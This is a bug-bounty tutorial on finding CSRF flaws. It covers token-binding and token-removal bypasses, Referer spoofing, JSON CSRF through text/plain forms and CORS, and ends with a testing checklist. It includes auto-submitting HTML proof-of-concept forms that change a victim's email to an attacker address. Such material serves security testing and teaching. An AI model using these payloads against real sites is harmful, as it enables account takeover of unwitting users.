CSRF
CSRF is not dead. It's just that the low-hanging fruit is gone  -  every modern framework ships anti-CSRF tokens by default, and SameSite=Lax is now the browser default. What's left is more interesting: token validation gaps, JSON endpoints, SameSite misconfigurations, and logic that developers assumed was "safe."
When CSRF Still Matters in 2026
SameSite=Lax blocks most cross-site form posts but doesn't protect everything. Top-level navigations with GET are still allowed. SameSite=None means the old rules apply. And plenty of apps are still running legacy auth flows that pre-date SameSite defaults. Always check Set-Cookie headers before assuming you're wasting your time.

Token Bypass Techniques
Token Not Tied to Session
Submit the token from your own account with another user's session. If it validates, the token is global  -  not user-bound.
POST /account/email/update HTTP/1.1
Cookie: session=VICTIM_SESSION
Content-Type: application/x-www-form-urlencoded
 
email=attacker@evil.com&csrf_token=ATTACKER_KNOWN_TOKEN
Token Tied to Session But Removable
Delete the token parameter entirely. Some backends only validate it if it's present.
email=attacker@evil.com&csrf_token=    → 403
email=attacker@evil.com               → 200  ← vulnerable
Token in Cookie, Matched Against Header (Double Submit)
If the CSRF token is set as a cookie and the backend just checks header == cookie, you can exploit it if you have any cookie injection primitive  -  including a subdomain takeover or header injection.
Referer-Based Validation
Some apps use the Referer header instead of tokens. Strip it entirely or supply a URL that contains the expected hostname:
Referer: target.com.evil.com/
Referer: evil.com/://target.com
JSON CSRF
Content-Type: application/json used to require a preflight, making cross-origin JSON posts impossible without CORS cooperation. That's still true for application/json. But a lot of apps accept JSON-encoded data with text/plain  -  which doesn't trigger a preflight.
<!-- text/plain form encoding that sends JSON -->
<form method="POST" action="target.com/api/user/update" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>
The body arrives as: {"email":"attacker@evil.com","ignore":"="}  -  valid JSON if the server's parser is lenient.
Also test: does the API accept application/x-www-form-urlencoded as a fallback? I've seen "REST APIs" that silently decode form-encoded bodies because some framework middleware parses both formats.

The Lax grace period  -  Chrome had a 2-minute window where newly set Lax cookies were sent cross-site for top-level POSTs  -  is gone. But GET-based CSRF remains valid under Lax.
CORS Preflight Bypass for CSRF
If a target has a permissive CORS config (Access-Control-Allow-Origin: * or reflecting origin), attackers can make credentialed cross-origin requests from JS  -  which is a different threat model from classical CSRF but achieves the same effect. The difference: with CORS you can read the response. See CORS Misconfigurations.
PoC Template
<!DOCTYPE html>
<html>
<body>
<h2>CSRF PoC  -  [TARGET ACTION]</h2>
<form id="csrf" method="POST" action="target.com/account/update">
  <input type="hidden" name="email" value="attacker@evil.com">
  <!-- Remove csrf_token field if testing removal bypass -->
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
For JSON content-type endpoints:
<form id="csrf" method="POST" action="target.com/api/update" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","x":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>
What Makes a CSRF Report Actually Pay
CSRF on a GET request that changes state  -  password reset, email change, account deletion. CSRF chained with Clickjacking for user interaction. Account takeover via email/password change  -  that's typically P2. Profile update with no sensitive impact  -  P4, often OOS. Know your program's severity scale before submitting low-impact CSRF.
Checklist

 Check every Set-Cookie header  -  what's the SameSite value?
 Find state-changing GET endpoints  -  they're vulnerable even under Lax
 For POST endpoints: is there a CSRF token?
 Try removing the token entirely
 Try using your own token with a victim's session
 Check if the endpoint accepts text/plain or form-encoding for JSON APIs
 Does the app use Referer validation? Test stripping and manipulating it
 Check for CORS config that would allow credentialed reads
